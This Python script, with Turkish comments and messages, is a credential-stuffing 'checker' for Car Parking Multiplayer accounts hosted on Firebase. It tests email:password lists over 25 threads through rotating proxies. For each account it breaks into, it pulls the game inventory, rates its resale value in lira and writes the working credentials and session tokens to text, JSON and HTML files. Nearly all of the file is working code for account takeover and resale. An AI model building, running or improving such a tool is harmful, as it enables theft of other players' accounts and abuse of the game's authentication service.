#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
=============================================================================
🚀 CPM & FIREBASE HESAP CHECKER (PRO EDITION - DEĞERLEME & PROXY & WEB)
=============================================================================
• 'user.txt' içindeki hesapları Firebase Auth ve CPM Cloud Functions ile paralel test eder.
• Nadir araçları, polis çakarlarını, çizimleri ve hesap değerlerini analiz eder.
• Sonuçları 'results/' klasörüne 'saatdkgünayyıl' formatında kaydeder:
    1. Sade Kayıt (email:password)      -> results/valid_sade.txt
    2. Detaylı JSON Kayıt                -> results/valid_detayli.json
    3. Detaylı TXT Rapor                 -> results/valid_detayli.txt
    4. İnteraktif HTML Dashboard         -> results/valid_dashboard.html
    5. Akıllı Kategori Dosyaları         -> results/valid_[vip/polis/cizim/klan/temiz].txt
=============================================================================
"""

import sys
import os
import json
import time
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

from core import (
    C, init_terminal, p_header, p_success, p_warn, p_error, p_info,
    Config, DEFAULT_API_KEY, USERS_FILE, RESULTS_DIR, CF_BASE_URL,
    http_post, format_timestamp, login_request,
    save_compact_json, generate_html_dashboard, parse_user_file,
    valuate_account, parse_car_details
)
from core.proxy import ProxyManager
from core.batch import export_categorized_accounts
from core.web_server import start_local_web_dashboard

init_terminal()

print_lock = threading.Lock()
file_write_lock = threading.Lock()

# =============================================================================
# 🎮 TEK HESAP CPM OYUN VERİLERİ ÇEKİCİ & DEĞERLEYİCİ
# =============================================================================
def fetch_account_details(email, password, id_token, uid):
    details = {
        "email": email,
        "password": password,
        "uid": uid,
        "idToken": id_token,
        "cpm_level": 0,
        "cpm_reports": 0,
        "cpm_can_play": 1,
        "cpm_unlocked_cars": 0,
        "cpm_unlocked_ids": [],
        "cpm_custom_cars": 0,
        "cpm_custom_ids": [],
        "cpm_total_cars": 0,
        "garage_cars": [],
        "cpm_clan_id": None,
        "firebase_profile": {},
        "checked_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }

    cf_headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {id_token}"
    }

    # 🚀 TÜM ALT İSTEKLERİ PARALEL ÇALIŞTIR (5x HIZ ARTIŞI)
    with ThreadPoolExecutor(max_workers=5) as ex:
        f_prof = ex.submit(http_post, f"https://identitytoolkit.googleapis.com/v1/accounts:lookup?key={Config.get_api_key()}", {"idToken": id_token}, timeout=3.5)
        f_conn = ex.submit(http_post, f"{CF_BASE_URL}/GetUserConnectionData2", {"data": {}}, cf_headers, timeout=3.5)
        f_status = ex.submit(http_post, f"{CF_BASE_URL}/WSGetCarIDnStatusV3", {"data": {}}, cf_headers, timeout=3.5)
        f_cars = ex.submit(http_post, f"{CF_BASE_URL}/GetAllCars2", {"data": {}}, cf_headers, timeout=3.5)
        f_clan = ex.submit(http_post, f"{CF_BASE_URL}/GetClanId", {"data": {}}, cf_headers, timeout=3.5)

        prof_res, _ = f_prof.result()
        conn_res, _ = f_conn.result()
        status_res, _ = f_status.result()
        cars_res, _ = f_cars.result()
        clan_res, _ = f_clan.result()

    # 1. Firebase Profil
    if prof_res and isinstance(prof_res, dict) and "users" in prof_res and len(prof_res["users"]) > 0:
        u = prof_res["users"][0]
        details["firebase_profile"] = {
            "displayName": u.get("displayName"),
            "photoUrl": u.get("photoUrl"),
            "emailVerified": u.get("emailVerified", False),
            "disabled": u.get("disabled", False),
            "createdAt": format_timestamp(u.get("createdAt")),
            "lastLoginAt": format_timestamp(u.get("lastLoginAt")),
            "passwordUpdatedAt": format_timestamp(u.get("passwordUpdatedAt"))
        }

    # 2. Level, Reports, Ban
    if conn_res and isinstance(conn_res, dict) and "result" in conn_res:
        try:
            c_data = json.loads(conn_res["result"]) if isinstance(conn_res["result"], str) else conn_res["result"]
            if isinstance(c_data, dict):
                details["cpm_level"] = c_data.get("level", 0)
                details["cpm_reports"] = c_data.get("reports", 0)
                details["cpm_can_play"] = c_data.get("canPlay", 1)
        except Exception:
            pass

    # 3. Açık Araç ID Listesi
    if status_res and isinstance(status_res, dict) and "result" in status_res:
        try:
            s_data = json.loads(status_res["result"]) if isinstance(status_res["result"], str) else status_res["result"]
            if isinstance(s_data, dict) and "carStatus" in s_data:
                car_status = s_data["carStatus"]
                unlocked_ids = [i for i, x in enumerate(car_status) if x == 1]
                details["cpm_unlocked_cars"] = len(unlocked_ids)
                details["cpm_unlocked_ids"] = unlocked_ids
        except Exception:
            pass

    # 4. Modifiyeli Garaj Araç ID Listesi & Çizim / Plaka Ayrıştırma
    if cars_res and isinstance(cars_res, dict) and "result" in cars_res:
        try:
            raw_cars = json.loads(cars_res["result"]) if isinstance(cars_res["result"], str) else cars_res["result"]
            if isinstance(raw_cars, list):
                custom_ids = []
                parsed_cars = []
                for car in raw_cars:
                    if isinstance(car, dict) and "CarID" in car:
                        custom_ids.append(car["CarID"])
                        p_car = parse_car_details(car)
                        parsed_cars.append(p_car)
                details["cpm_custom_cars"] = len(custom_ids)
                details["cpm_custom_ids"] = custom_ids
                details["cpm_cars"] = custom_ids
                details["garage_cars"] = parsed_cars
        except Exception:
            pass

    details["cpm_total_cars"] = max(details.get("cpm_unlocked_cars", 0), details.get("cpm_custom_cars", 0))

    # 5. Klan
    if clan_res and isinstance(clan_res, dict) and "result" in clan_res:
        details["cpm_clan_id"] = str(clan_res.get("result") or "").strip() or None

    # 6. Hesap Değerleme Motoru
    details["valuation"] = valuate_account(details)

    return details


def check_single_account(acc):
    email = acc["email"]
    password = acc["password"]

    res, err = login_request(email, password)

    if res and "idToken" in res:
        uid = res.get("localId", "")
        id_token = res["idToken"]
        details = fetch_account_details(email, password, id_token, uid)
        details["refreshToken"] = res.get("refreshToken")
        return True, details, None
    else:
        err_msg = err or "Giriş başarısız"
        if "INVALID_PASSWORD" in err_msg:
            err_msg = "Hatalı Şifre"
        elif "EMAIL_NOT_FOUND" in err_msg:
            err_msg = "Hesap Bulunamadı"
        elif "USER_DISABLED" in err_msg:
            err_msg = "Hesap Devre Dışı"
        elif "TOO_MANY_ATTEMPTS_TRY_LATER" in err_msg:
            err_msg = "Rate Limit (Bekleyin)"
        return False, {"email": email, "password": password}, err_msg


# =============================================================================
# 📊 TOPLU TURBO CHECKER (25 WORKERS)
# =============================================================================
def run_full_checker(file_path=USERS_FILE, threads=25):
    accounts = parse_user_file(file_path)
    if not accounts:
        print(f"\n{C.YELLOW}[!]{C.RESET} '{file_path}' dosyası bulunamadı veya içinde hesap yok!")
        return

    now = datetime.now()
    timestamp_str = now.strftime("%H-%M_%d-%m-%Y")
    
    run_dir = os.path.join(RESULTS_DIR, timestamp_str)
    os.makedirs(run_dir, exist_ok=True)

    file_sade = os.path.join(run_dir, "valid_sade.txt")
    file_detayli_json = os.path.join(run_dir, "valid_detayli.json")
    file_detayli_txt = os.path.join(run_dir, "valid_detayli.txt")
    file_invalid = os.path.join(run_dir, "invalid.txt")
    file_html = os.path.join(run_dir, "valid_dashboard.html")

    p_header(f"HESAP KONTROLÜ BAŞLADI ({len(accounts)} Hesap)")
    print(f"  {C.BOLD}Kaynak Dosya{C.RESET}   : {C.CYAN}{file_path}{C.RESET}")
    print(f"  {C.BOLD}Zaman Damgası{C.RESET}  : {C.YELLOW}{timestamp_str}{C.RESET}")
    print(f"  {C.BOLD}Sonuç Klasörü{C.RESET}  : {C.GREEN}{run_dir}/{C.RESET}")
    print(f"  {C.BOLD}İş Parçacığı{C.RESET}   : {threads} Workers")
    if ProxyManager.is_enabled():
        print(f"  {C.BOLD}Proxy Motoru{C.RESET}   : {C.GREEN}AKTİF ({ProxyManager.count()} Proxy Havuzu){C.RESET}")
    print()
    print("─" * 86)
    print(f"{C.BOLD}{'#':<4} {'DURUM':<14} {'E-POSTA / HESAP':<32} {'LEVEL':<7} {'ARAÇ':<6} {'DEĞERLEME'}{C.RESET}")
    print("─" * 86)

    valid_list = []
    invalid_list = []
    counter = 0
    total = len(accounts)

    start_time = time.time()

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(check_single_account, acc): acc for acc in accounts}

        for future in as_completed(futures):
            success, data, err_msg = future.result()
            with print_lock:
                counter += 1
                if success:
                    valid_list.append(data)
                    lvl_str = str(data.get('cpm_level') if data.get('cpm_level') is not None else '-')
                    cars_str = str(data.get('cpm_total_cars', 0))
                    val = data.get("valuation", {})
                    tier_badge = val.get("valuation_tier", "🥉 BRONZE")
                    est_badge = f"{val.get('estimated_tl', 0)} ₺"

                    print(f"{counter:<4} {C.GREEN}[✓ GEÇERLİ]{C.RESET:<14} {data['email']:<32} {lvl_str:<7} {cars_str:<6} {C.YELLOW}{tier_badge}{C.RESET} ({est_badge})")

                    with file_write_lock:
                        with open(file_sade, "a", encoding="utf-8") as f_s:
                            f_s.write(f"{data['email']}:{data['password']}\n")

                        with open(file_detayli_txt, "a", encoding="utf-8") as f_dt:
                            f_dt.write("=====================================================\n")
                            f_dt.write(f"Hesap       : {data['email']}:{data['password']}\n")
                            f_dt.write(f"UID         : {data['uid']}\n")
                            f_dt.write(f"CPM Seviye  : {data.get('cpm_level')}\n")
                            f_dt.write(f"Toplam Araç : {data.get('cpm_total_cars')} adet\n")
                            f_dt.write(f"Değerleme   : {tier_badge} (Tahmini: {est_badge})\n")
                            if data.get("cpm_cars"):
                                f_dt.write(f"Araç ID'ler : {data.get('cpm_cars')}\n")
                            if data.get("cpm_clan_id"):
                                f_dt.write(f"Klan ID     : {data.get('cpm_clan_id')}\n")
                            prof = data.get("firebase_profile", {})
                            if prof:
                                f_dt.write(f"Kayıt Tarihi: {prof.get('createdAt')}\n")
                                f_dt.write(f"Son Giriş   : {prof.get('lastLoginAt')}\n")
                            f_dt.write(f"idToken     : {data.get('idToken')}\n\n")
                else:
                    invalid_list.append(data)
                    err_clean = (err_msg or 'Bilinmiyor')[:30]
                    print(f"{counter:<4} {C.RED}[✗ HATALI]{C.RESET:<14} {data['email']:<32} {'-':<7} {'-':<6} {C.RED}{err_clean}{C.RESET}")
                    with file_write_lock:
                        with open(file_invalid, "a", encoding="utf-8") as f_inv:
                            f_inv.write(f"{data['email']}:{data['password']} | Hata: {err_msg}\n")

    # Sıralama (Puan ve araç sayısına göre)
    if valid_list:
        valid_list.sort(key=lambda x: (x.get("valuation", {}).get("score", 0), x.get('cpm_total_cars') or 0), reverse=True)

        with open(file_sade, "w", encoding="utf-8") as f_s:
            for acc in valid_list:
                f_s.write(f"{acc.get('email')}:{acc.get('password')}\n")

        save_compact_json(valid_list, file_detayli_json)

        with open(file_detayli_txt, "w", encoding="utf-8") as f_dt:
            for rank, acc in enumerate(valid_list, 1):
                val = acc.get("valuation", {})
                f_dt.write("=====================================================\n")
                f_dt.write(f"Sıra        : #{rank}\n")
                f_dt.write(f"Hesap       : {acc.get('email')}:{acc.get('password')}\n")
                f_dt.write(f"UID              : {acc.get('uid')}\n")
                f_dt.write(f"Değerleme & Puan : {val.get('valuation_tier')} (Puan: {val.get('score')}, Tahmini: {val.get('estimated_tl')} ₺)\n")
                f_dt.write(f"CPM Seviye       : Level {acc.get('cpm_level')}\n")
                f_dt.write(f"Toplam Açık Araç : {acc.get('cpm_unlocked_cars', acc.get('cpm_total_cars'))} adet\n")
                if acc.get("cpm_unlocked_ids"):
                    f_dt.write(f"Açık Araç ID'ler : {acc.get('cpm_unlocked_ids')}\n")
                f_dt.write(f"Modifiyeli Garaj : {acc.get('cpm_custom_cars', len(acc.get('cpm_cars', [])))} adet\n")
                if acc.get("cpm_custom_ids") or acc.get("cpm_cars"):
                    f_dt.write(f"Garaj Araç ID'ler: {acc.get('cpm_custom_ids') or acc.get('cpm_cars')}\n")
                if acc.get("cpm_clan_id"):
                    f_dt.write(f"Klan ID          : {acc.get('cpm_clan_id')}\n")
                prof = acc.get("firebase_profile", {})
                if prof:
                    f_dt.write(f"Kayıt Tarihi     : {prof.get('createdAt')}\n")
                    f_dt.write(f"Son Giriş        : {prof.get('lastLoginAt')}\n")
                f_dt.write(f"idToken          : {acc.get('idToken')}\n\n")

        with open("valid_accounts.json", "w", encoding="utf-8") as f_root:
            json.dump(valid_list, f_root, indent=2, ensure_ascii=False)

        try:
            generate_html_dashboard(valid_list, file_html, title=f"CPM & Firebase Hesap Raporu ({timestamp_str})")
        except Exception:
            pass

        cat_exported = export_categorized_accounts(valid_list, run_dir)

    elapsed = round(time.time() - start_time, 2)

    print("─" * 86)
    print(f"\n{C.GREEN}{C.BOLD}✨ KONTROL VE SIRALAMA TAMAMLANDI!{C.RESET} ({elapsed} saniye)")
    print(f"  • {C.BOLD}Toplam Taranan{C.RESET} : {total}")
    print(f"  • {C.GREEN}{C.BOLD}Geçerli Hesap{C.RESET}  : {len(valid_list)}")
    print(f"  • {C.RED}{C.BOLD}Hatalı Hesap{C.RESET}   : {len(invalid_list)}")
    if valid_list:
        print(f"  • {C.CYAN}{C.BOLD}HTML Paneli{C.RESET}    : {file_html}")

    if valid_list:
        print(f"\n{C.YELLOW}{C.BOLD}🏆 EN DEĞERLİ İLK 15 HESAP (SIRALAMA):{C.RESET}")
        print(f"{C.BOLD}{'SIRA':<6} {'E-POSTA':<32} {'DEĞERLEME':<20} {'ARAÇ':<8} {'LEVEL':<8} {'ŞİFRE'}{C.RESET}")
        print("─" * 86)
        for r_idx, acc in enumerate(valid_list[:15], 1):
            val = acc.get("valuation", {})
            tier_badge = f"{C.MAGENTA}{val.get('valuation_tier', 'BRONZE')}{C.RESET}"
            cars_badge = f"{C.GREEN}{acc.get('cpm_total_cars', 0)} Araç{C.RESET}"
            lvl_badge = f"Lvl {acc.get('cpm_level', 0)}"
            print(f"#{r_idx:<5} {acc['email']:<32} {tier_badge:<29} {cars_badge:<17} {lvl_badge:<8} {acc['password']}")

    print(f"\n{C.CYAN}{C.BOLD}📁 SIRALI KAYDEDİLEN DOSYALAR ({RESULTS_DIR}/):{C.RESET}")
    print(f"  1. 📄 Sade Liste (En Doludan Boşa) : {C.WHITE}{file_sade}{C.RESET} ({C.GREEN}{len(valid_list)} hesap{C.RESET})")
    print(f"  2. 📑 Detaylı JSON (Sıralı)        : {C.WHITE}{file_detayli_json}{C.RESET}")
    print(f"  3. 📝 Detaylı Rapor (Sıralı)       : {C.WHITE}{file_detayli_txt}{C.RESET}")
    if valid_list:
        print(f"  4. 🌐 İnteraktif HTML Dashboard    : {C.GREEN}{file_html}{C.RESET}")
    if invalid_list:
        print(f"  5. ❌ Hatalı Hesaplar              : {C.DIM}{file_invalid}{C.RESET}")

    if valid_list and cat_exported:
        print(f"\n{C.CYAN}{C.BOLD}🎯 AKILLI KATEGORİ LİSTELERİ ({run_dir}/):{C.RESET}")
        for fn, cnt in cat_exported.items():
            print(f"  • {C.GREEN}{fn:<32}{C.RESET}: {C.BOLD}{cnt}{C.RESET} hesap")
    print()


# =============================================================================
# 🖥️ ANA MENÜ
# =============================================================================
def main_menu():
    while True:
        acc_count = len(parse_user_file(USERS_FILE))
        proxy_info = f"{C.GREEN}{ProxyManager.count()} Proxy Aktif{C.RESET}" if ProxyManager.is_enabled() else f"{C.DIM}Devre Dışı (proxies.txt yok){C.RESET}"
        print(f"""
{C.CYAN}{C.BOLD}=============================================================
🚀  CPM & FIREBASE HESAP CHECKER (PRO EDITION)
============================================================={C.RESET}
  {C.DIM}Hesap Listesi :{C.RESET} {C.BOLD}{USERS_FILE}{C.RESET} ({C.YELLOW}{acc_count} Hesap Yüklü{C.RESET})
  {C.DIM}Proxy Havuzu  :{C.RESET} {proxy_info}
  {C.DIM}Kayıt Formatı :{C.RESET} {C.GREEN}results/HH-MM_DD-MM-YYYY/ [TXT / JSON / HTML / Kategori]{C.RESET}
  {C.DIM}Sıralama      :{C.RESET} {C.GREEN}Değerleme puanı & araç sayısına göre sıralı 🏆{C.RESET}
-------------------------------------------------------------
  {C.BOLD}{C.GREEN}[1] ⚡ LİSTEDEKİ HESAPLARI TEST ET & DEĞERLE & SIRALA{C.RESET}
  {C.BOLD}{C.MAGENTA}[2] 🌐 Localhost Web Panelini Başlat (Browser Dashboard){C.RESET}
  {C.BOLD}{C.YELLOW}[3] 👥 Hesap Değiştirici (Tek Hesaba Giriş Yap & Aktif Et){C.RESET}
  {C.BOLD}{C.CYAN}[4] 📁 Kaydedilen 'results/' Klasörünü Aç / İncele{C.RESET}
  {C.BOLD}{C.WHITE}[0] 🚪 Çıkış{C.RESET}
-------------------------------------------------------------""")

        choice = input(f"{C.BOLD}Seçiminiz [1]: {C.RESET}").strip()

        if choice == "1" or choice == "":
            run_full_checker(USERS_FILE)
            input(f"{C.DIM}Devam etmek için Enter'a basın...{C.RESET}")
        elif choice == "2":
            start_local_web_dashboard()
        elif choice == "3":
            from core.batch import run_account_switcher
            run_account_switcher()
            input(f"{C.DIM}Devam etmek için Enter'a basın...{C.RESET}")
        elif choice == "4":
            if os.path.exists(RESULTS_DIR):
                files = os.listdir(RESULTS_DIR)
                p_header("📁 RESULTS KLASÖRÜNDEKİ DOSYALAR")
                for idx, f in enumerate(files, 1):
                    print(f"  [{idx:02d}] {f}")
            else:
                p_warn("Henüz 'results/' klasörü oluşmamış.")
            input(f"\n{C.DIM}Devam etmek için Enter'a basın...{C.RESET}")
        elif choice == "0":
            print(f"\n{C.CYAN}[*]{C.RESET} Çıkış yapıldı. İyi çalışmalar!")
            break


if __name__ == "__main__":
    if "--web" in sys.argv:
        start_local_web_dashboard()
    else:
        main_menu()
